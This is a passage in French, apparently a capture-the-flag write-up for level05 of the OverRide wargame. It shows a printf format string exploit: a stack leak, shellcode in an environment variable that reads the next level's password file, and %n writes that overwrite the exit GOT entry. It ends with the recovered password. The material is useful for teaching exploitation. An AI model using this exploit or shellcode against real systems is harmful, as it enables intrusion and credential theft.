@@ -1,0 +1,49 @@
+Premierement, on a ici une utilisation de printf, vulnerable au format string exploit.
+
+level05@OverRide:~$ ltrace ./level05
+__libc_start_main(0x8048444, 1, -10556, 0x8048520, 0x8048590 <unfinished ...>
+fgets(ok
+"ok\n", 100, 0xf7fcfac0)                          = 0xffffd5b8
+printf("ok\n"ok
+)                                          = 3
+exit(0 <unfinished ...>
++++ exited (status 0) +++
+
+level05@OverRide:~$ ltrace ./level05
+__libc_start_main(0x8048444, 1, -10556, 0x8048520, 0x8048590 <unfinished ...>
+fgets(%p
+"%p\n", 100, 0xf7fcfac0)                          = 0xffffd5b8
+printf("%p\n", 0x640x64
+)                                    = 5
+exit(0 <unfinished ...>
++++ exited (status 0) +++
+
+On a aussi une restriction pour la taille du buffer
+level05@OverRide:~$ python -c 'print("aaaa" + "%x " * 500 + "bbbb")' | ./level05
+aaaa64 f7fcfac0 f7ec3af9 ffffd5df ffffd5de 0 ffffffff ffffd664 f7fdb000 61616161 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
+
+Il ne nous reste pas beaucoup de choix, autre que de modifier l'adresse d'un prochain call pour jump sur le debut de notre shellcode en variable d'environnement.
+
+level05@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass")')
+
+(gdb) x/32x *environ
+0xffffd7f4:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090
+
+(gdb) x/i 0x8048370
+   0x8048370 <exit@plt>:	jmp    DWORD PTR ds:0x80497e0
+
+level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "%20$x")' | ./level05
+8048520
+
+>>> 0xd824 - 8
+55324
+>>> 0xffff - 0xd824
+10203
+
+level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55324c" + "%10$n" + "%10203c" + "%11$n")' | ./level05
+	...
+                                                                                                                  �
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
